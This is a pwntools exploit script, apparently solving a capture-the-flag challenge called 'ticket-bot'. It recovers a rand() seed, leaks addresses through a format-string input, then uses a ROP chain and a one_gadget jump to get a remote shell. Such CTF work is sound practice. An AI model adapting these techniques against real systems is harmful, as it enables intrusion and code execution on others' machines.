#!/usr/bin/env python3
import ctypes

from pwn import *

fname = "chal_patched"
ip = "ticket-bot.challs.csc.tf"
port = 1337
elf = context.binary = ELF("./chal")
libc = ELF("./libc.so.6")
rop = ROP(elf)

LOCAL = True

gdbscript = """
    b *main
    c

    """

if LOCAL:
    r = process(f"./{fname}", aslr=True)
    # set follow-fork-mode

    # attach('chal',gdbscript=gdbscript)
else:
    r = remote(ip, port)

s = lambda x: r.send(x)
rl = lambda: r.recvline()
rlb = lambda: r.recvlineb()
sl = lambda x: r.sendline(x)
ru = lambda x: r.recvuntil(x)
rb = lambda x: r.recvb(x)
sla = lambda x, y: r.sendlineafter(x, y)
inter = lambda: r.interactive()

libc = ctypes.CDLL("./libc.so.6")


def testseed(seed):
    for i in range(9999999):
        libc.srand(i)
        test = libc.rand()
        test_A = libc.rand()
        # print(f'testing {test_A} against {a}')
        if test_A == seed:
            print("yep")
            return i


def pwn():

    ru("Wellcome to TicketBot v1.0 here is your ticketID ")
    seed = int(rl()[:-1], 10)

    randseed = testseed(seed)

    print(f"the rand() seed is: {randseed}")
    libc.srand(randseed)
    adminpw = libc.rand()
    print(f"the Admin Password is: {adminpw}")

    sl("2")

    sl(str(adminpw))

    sl("1")

    sl("%9$p")

    ru("Password changed to\n")

    leak = int(rb(14), 16)
    print(f"leaked PIE addr is: {hex(leak)}")
    elf.address = leak - 5167
    print(f"PIE base is: {hex(elf.address)}")
    sl("2")
    sl("0")
    sl("1")

    pop_rdi = elf.address + rop.find_gadget(["pop rdi", "ret"])[0]

    payload = b""
    payload += b"aaaaaaabaaacaaad"
    payload += p64(pop_rdi)
    payload += p64(elf.got["puts"])
    payload += p64(elf.plt["puts"])
    payload += p64(elf.symbols["AdminMenu"])
    sl(payload)

    ru("Password changed to\naaaa")
    # print(r.recv())
    leak2 = unpack(rl()[:-1], "all")
    print(f"libc puts addr is: {hex(leak2)}")

    libc.address = leak2 - 0x84450
    print(f"libc base addr is: {hex(libc.address)}")

    one = libc.address + 0xE3B31
    sl("1")

    payload = b""
    payload += b"aaaaaaabaaacaaad"
    payload += p64(one)

    sl(payload)

    inter()


if __name__ == "__main__":
    pwn()
